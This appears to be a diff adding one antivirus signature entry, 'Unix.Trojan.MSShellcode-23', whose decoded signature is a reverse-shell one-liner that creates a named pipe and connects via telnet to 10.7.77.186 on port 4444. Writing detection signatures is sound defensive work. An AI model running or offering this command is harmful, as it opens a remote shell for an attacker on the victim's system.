@@ -1,0 +1,5 @@
+VIRUS NAME: Unix.Trojan.MSShellcode-23
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+mknod NcnCDZYh p && telnet -z verify=0 10.7.77.186 4444 0<NcnCDZ
